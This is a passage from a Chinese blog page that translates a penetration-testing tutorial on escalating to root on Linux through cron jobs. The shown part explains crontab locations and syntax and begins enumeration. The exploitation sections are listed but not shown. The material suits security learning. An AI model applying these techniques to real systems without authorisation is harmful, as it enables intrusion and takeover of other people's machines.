<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-Cron Jobs" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-Cron Jobs | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-Cron Jobs | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Cron Jobs – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Cron Jobs – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.799afac8.js" defer="defer"></script>
<script src="/web/assets/js/main.73484f69.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-Cron Jobs</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-Cron Jobs</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/cron-jobs-lpe/" target="_blank" rel="noopener noreferrer">Cron Jobs – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 什么是 Cron Job？</a>
<ul>
<li><a href="#id1.1">1.1 了解 Crontabs 和 Cron 目录</a></li>
<li><a href="#id1.2">1.2 如何在 Crontab 文件中读取 Cron 作业</a></li>
</ul>
</li>
<li><a href="#id2">2 寻找 Cron 任务 – 手动方法</a>
<ul>
<li><a href="#id2.1">2.1 枚举系统 Cron 作业</a></li>
<li><a href="#id2.2">2.2 枚举用户 Cron 作业</a></li>
</ul>
</li>
<li><a href="#id3">3 寻找 Cron 任务 – LinPEAS 方法</a>
<ul>
<li><a href="#id3.1">3.1 将 LinPEAS 下载到受害者</a></li>
<li><a href="#id3.2">3.2 用 LinPEAS 查找系统 Cron 作业</a></li>
</ul>
</li>
<li><a href="#id4">4 利用 Cron Jobs – Cron PATH</a>
<ul>
<li><a href="#id4.1">4.1 确定如何利用 Cron Job</a></li>
<li><a href="#id4.2">4.2 设置漏洞并获取 Root Shell</a></li>
<li><a href="#id4.3">4.3 用脚本替换 syctemctl 二进制文件</a></li>
</ul>
</li>
<li><a href="#id5">5 利用 Cron Jobs – 弱文件权限</a>
<ul>
<li><a href="#id5.1">5.1 确定如何利用 Cron Job</a></li>
<li><a href="#id5.2">5.2 设置漏洞并获取 Root Shell</a></li>
</ul>
</li>
<li><a href="#id6">6 利用 Cron Jobs – 弱目录权限</a>
<ul>
<li><a href="#id6.1">6.1 确定如何利用 Cron Job</a></li>
<li><a href="#id6.2">6.2 设置漏洞并获取 Root Shell</a></li>
</ul>
</li>
<li><a href="#id7">7 利用 Cron Jobs – tar 通配符注入</a>
<ul>
<li><a href="#id7.1">7.1 将 Shell 升级到完整 TTY</a></li>
<li><a href="#id7.2">7.2 审查 LinPEAS 输出</a></li>
<li><a href="#id7.3">7.3 确定如何利用 Cron Job</a></li>
<li><a href="#id7.4">7.4 设置漏洞并获取 Root Shell</a></li>
</ul>
</li>
<li><a href="#id8">8 利用 Cron Jobs – 隐藏的 Cron Jobs</a>
<ul>
<li><a href="#id8.1">8.1 确定 Cron 守护进程是否正在运行</a></li>
<li><a href="#id8.2">8.2 使用 PsPy 寻找隐藏的 Cron 任务</a></li>
<li><a href="#id8.3">8.3 确定如何利用 Cron Job</a></li>
<li><a href="#id8.4">8.4 设置漏洞并获取 Root Shell</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将深入研究 cron 作业以及如何利用它们将我们的权限从标准用户升级到 root。</p>
<p>我们首先了解什么是 cron 作业以及它们如何工作，然后，我们再了解如何使用手动方法以及自动化工具 LinPEAS 来枚举它们。</p>
<p>在学习了如何枚举正在运行的 cron 作业之后，我们将回顾五个独特的 cron 作业示例。</p>
<p>在每个示例中，我们将找到一个正在运行的 cron 作业，然后确定是否满足允许我们利用它的所有条件。一旦确认，我们将利用 cron 作业将我们的权限提升到 root。</p>
<p>此外，对于我们利用的每个 cron 作业，我们还将使用不同的技术来提升到 root 权限。</p>
<p>这会是一件好事，所以让我们马上开始吧！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1什么是-cron-job"><strong><div id="id1">1、什么是 Cron Job？</div></strong><a href="#1什么是-cron-job" class="hash-link" aria-label="1什么是-cron-job的直接链接" title="1什么是-cron-job的直接链接">​</a></h2>
<p>Cron 作业是 Linux 版本的计划任务。它们几乎可以设置为每分钟运行一次或每年运行一次。</p>
<p>crond守护进程启用 cron 功能并读取 <strong>crontab</strong> 以执行列出的任何预定义脚本或命令。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="11了解-crontabs-和-cron-目录"><strong><div id="id1.1">1.1、了解 Crontabs 和 Cron 目录</div></strong><a href="#11了解-crontabs-和-cron-目录" class="hash-link" aria-label="11了解-crontabs-和-cron-目录的直接链接" title="11了解-crontabs-和-cron-目录的直接链接">​</a></h4>
<p>有两种类型的 crontab 可用于运行 cron 作业：</p>
<ul>
<li><strong>系统 crontab</strong> – 用于安排系统范围的作业 – 默认系统 crontab 配置文件位于 <strong>/etc/crontab</strong>。</li>
<li><strong>用户 crontab</strong> – 此文件允许用户创建和编辑仅适用于用户级别的 cron 作业 – 使用<strong>crontab -e</strong>命令创建并存储在 <strong>/var/spool/cron/crontabs</strong>中。</li>
</ul>
<blockquote>
<p>请注意，使用crontab -e命令创建的 crontab仅对创建它们的用户可见，它们无法以标准方式枚举，这就是它们被视为 <strong>“隐藏 cron 作业”</strong> 的原因。标准用户甚至无法访问存储它们的目录，标准用户查看其 crontab 的唯一方法是使用 crontab 命令。</p>
</blockquote>
<p>除了 crontabs 之外，还可以将 cron 作业添加到 <strong>etc/cron.d</strong> 目录中。但是，这不是一个好习惯，因为 <strong>cron.d</strong> 主要用于放置软件或系统自动安装和更新时附带的计划任务文件。</p>
<p>或者，root 用户也可以将其脚本移动到以下目录中以安排其执行（也是不好的做法）：</p>
<ul>
<li><strong>/etc/cron.hourly/</strong>  – 每小时运行一次所有脚本</li>
<li><strong>/etc/cron.daily/</strong>  – 每天运行一次。</li>
<li><strong>/etc/cron.weekly/</strong>  – 每周运行一次。</li>
<li><strong>/etc/cron.monthly/</strong>  – 每月运行一次。</li>
</ul>
<p>root 用户创建 cron 作业的唯二地方是： <strong>/etc/crontab 文件或 /var/spool/cron/crontabs/root 中的个人 crontab 文件</strong>。</p>
<p>作为攻击者，我们应该记住可以创建 cron 作业的其他位置。良好的做法并不总是标准做法，因此我们应该检查可以存储 cron 作业的所有可能位置。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="12如何在-crontab-文件中读取-cron-作业"><strong><div id="id1.2">1.2、如何在 Crontab 文件中读取 Cron 作业</div></strong><a href="#12如何在-crontab-文件中读取-cron-作业" class="hash-link" aria-label="12如何在-crontab-文件中读取-cron-作业的直接链接" title="12如何在-crontab-文件中读取-cron-作业的直接链接">​</a></h4>
<p>最后，我们需要知道如何读取 cron 任务。幸运的是，/etc/crontab 文件对此做了很好的解释。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/crontab</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547292-387800225-5debb84d1c52db1bbb0eabfaa685b411.png" width="833" height="380" class="img_ev3q"></p>
<p>首先，我们可以看到 cron SHELL 和 cron PATH，它们本质上是 crontabs 的环境变量。</p>
<ul>
<li>cron SHELL 用于执行 cron 作业，如下所示：<code>/bin/sh -c &lt;command&gt;</code>。</li>
<li>cron PATH 的工作方式与任何用户的 PATH 相同。这样，如果在 cron 作业中使用了没有绝对路径的命令，则 cron 作业将从左到右检查 PATH 中的每个目录，直到找到命令/脚本。</li>
</ul>
<p>接下来，它向我们展示了作业定义，我们可以从中看到 cron 计时器是如何创建的。</p>
<p>有六个位置可以添加值来创建 cron 作业的运行时间表。星号表示所有可能的值。例如：</p>
<ul>
<li>5 * * * * * = 作业每 5 分钟运行一次</li>
<li>* 12 * * * 1 = 作业每周一中午 12 点运行</li>
<li>52 6 1 * * * = 作业每月 1 日上午 6:52 运行</li>
</ul>
<p>最后，我们还有四个预定义的 cron 作业，它们允许其他四个目录中的作业从单个位置执行。</p>
<p>现在我们了解了什么是 cron 作业、它们如何工作以及在哪里可以找到它们，让我们看看如何手动和使用工具枚举 cron 作业。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2寻找-cron-任务---手动方法"><strong><div id="id2">2、寻找 Cron 任务 - 手动方法</div></strong><a href="#2寻找-cron-任务---手动方法" class="hash-link" aria-label="2寻找-cron-任务---手动方法的直接链接" title="2寻找-cron-任务---手动方法的直接链接">​</a></h2>
<p>对于此示例，假设我们在属于用户<strong>devops</strong>的 NFS 共享文件夹中找到了一个密码。</p>
<p>找到用户凭证后，我们能够使用 SSH 在目标主机上立足。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113639821-1919279140-913dce00daf5b6f02105d7d7e9cd0cc5.png" width="632" height="496" class="img_ev3q"></p>
<blockquote>
<p>由于我们能够通过 SSH 获得立足点，因此我们已经拥有了完整的 TTY，不需要再升级终端。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21枚举系统-cron-作业"><strong><div id="id2.1">2.1、枚举系统 Cron 作业</div></strong><a href="#21枚举系统-cron-作业" class="hash-link" aria-label="21枚举系统-cron-作业的直接链接" title="21枚举系统-cron-作业的直接链接">​</a></h4>
<p>我们要检查 cron 作业的第一个地方就是系统 crontab 文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/crontab</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 